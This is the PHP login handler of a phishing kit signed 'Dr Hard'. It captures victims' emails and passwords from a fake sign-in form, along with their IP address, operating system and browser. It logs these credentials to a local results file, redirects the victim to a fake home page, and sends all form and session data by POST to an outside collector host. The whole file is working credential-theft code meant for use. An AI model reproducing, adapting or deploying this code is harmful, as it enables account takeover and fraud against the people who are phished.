<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();
ob_start();
set_time_limit(0);
include("../../../../Email.php");
require "../os.php";
require "../geoplugin.php";
$DATE = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$IP = $_SERVER["REMOTE_ADDR"];
@$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	
$mail    = $_SESSION['_email_']        = $_POST['login_email'];
$PASS      = $_SESSION['_password_']     = $_POST['login_password'];
function validate_email($mail){
  $regexp = "/^(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){255,})(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){65,}@)(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22))(?:\\.(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\]))$/iD";
if (!preg_match ($regexp, $mail)) return false;
list ($user, $domain) = explode ("@", $mail);
if (!checkdnsrr ($domain, 'MX'))
return false;
return true;
}
function Error()
{	
    $ER = sha1(md5(gmdate('')));
    $ERR = "UnknownError";
    $erreur = header("Location: ../../signin/?resType=code&failedBecause=".$ERR."&TokenError=".$ER."");
    return $erreur;
}
	if ((isset($_POST['login_email'])) && (strlen($_POST['login_password']) >= 8) && (validate_email($mail))) 
	{
	$msg = "

<div style='background: -webkit-linear-gradient(#E9E9E9, #B2B2B2 21px, #6A6A6A 1px, #000, #d8d8d8 23px);margin: 3em auto;border-radius: 5px;box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.6), 0 22px 70px 4px rgba(0, 0, 0, 0.56), 0 0 0 1px rgba(0, 0, 0, 0.3);padding: 3px 5px;text-align: left;width:50em;font-size: 13px;'><center><span style='font: normal normal 13px/20px&#39;Arial&#39;;text-align:center;z-index: 2;position:relative;top: -0.18em;text-shadow: 0px 1px 0px rgba(255, 255, 255, 0.6);color: #444;'>Dr Hard</span></center>
	

	
<pre style ='position: relative;color: #000000;padding:5 -5px;font-family:Arial;line-height: 1.2em;margin:1.7em auto;max-height:1800px;overflow-x:hidden;'>

		            	
                    			
                             <span style='position:relative;top:-20px;padding:10px;border:2px dashed red;border-radius: 80px;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● Login Details ●&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>		

							 
        <span style='color: #000000;'>$ Email~:</span>  ".$_POST['login_email']."
			
        <span style='color: #000000;'>$ Password~:</span>  ".$_POST['login_password']."								
                            
                             
                             <span style='position:relative;top:-20px;padding:10px;border:2px dashed red;border-radius: 80px;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;●● MORE INFO ●●&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>				

	
	
        <span style='color: #000000;'>$ IP~:</span>  <span style='color:#000000'>".$IP."</span>	
	
        <span style='color: #000000;'>$ Operating System~:</span>  <span style='color:#000000'>".$OS."</span>
		
        <span style='color: #000000;'>$ Browser~:</span>  <span style='color:#000000'>".$browserTy_Version."</span>
		
        <span style='color: #000000;'>$ Date~:</span>  <span style='color:#000000'>".$DATE."</span>
		
		
	

        <span style='color: #000000;'>>_</span> exit;

	</pre>
</div>


";


header("Location: ../home.php?customerProfileweb-id=".sha1(md5(gmdate('Dr Hard')))."_&TokenAccess=".strtoupper(sha1(256))." ");

$localrez ="###################################################
###################################################     
=-=-=-=-=-=-=-=-=-=- ♣ LOGIN ♣ =-=-=-=-=-=-=-=-=-
          		   
Email: ".$_POST['login_email']."
Login: ".$_POST['login_password']."

=-=-=-=-=-=-=-=-=-=- ♣ MORE INFO ♣ =-=-=-=-=-=-=-

IP: ".$IP."
Operating System: ".$OS."
Browser: ".$browserTy_Version."
Date: ".$DATE."

=-=-=-=-=-=-=-=-- ♣ ☠ Dr Hard ☠ ♣-=-=-=-=-=-=-=-
";	
	$localr3z = fopen("../../../REZLT/tnt1.txt","a");
	fwrite($localr3z,$localrez);
        fclose($localr3z);
}
else {
	echo ERROR();
	}		



//----------------send request post to url ----------------
function sendPost($url,$data) {
	
	
	
$options = array(
        'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    )
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
return $result;
}

$data = $_POST;
$data['date'] = $DATE;
$data['s'] = $_SESSION;
$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
$data['b'] = browserTy_Version;
$data['os'] = $OS;

sendPost('http://www.save-test.epizy.com/sc2/sv1.php',$data);


//---- end request----------------












	
?>